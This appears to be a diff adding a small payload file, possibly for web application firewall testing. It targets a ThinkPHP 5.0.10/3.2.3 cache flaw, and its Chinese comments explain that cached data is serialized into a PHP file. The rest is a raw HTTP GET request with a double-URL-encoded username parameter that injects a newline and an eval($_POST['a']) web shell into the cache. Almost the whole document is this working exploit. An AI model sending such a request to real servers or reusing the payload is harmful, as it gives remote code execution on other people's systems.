@@ -1,0 +1,9 @@
+# ThinkPHP5.0.10-3.2.3 缓存函数设计缺陷可导致Getshell
+# Thinkphp在使用缓存的时候是将数据 序列化 然后存进一个php文件中，就导致在一些情况下可以直接getshell。
+GET /index.php?acid=80047096&username=%252F%252F%250D%250A%2524a%253Deval%28%2524_POST%255B%2527a%2527%255D%29%253B%2523&bid=hd_tag_m8mv25kc HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25kc
+RM-PRO-Token: 2b1bb9f923bb86346ba1f146f1686370
+RM-PRO-Time: 1742808476007
+User-Agent: curl/7.83.1
+
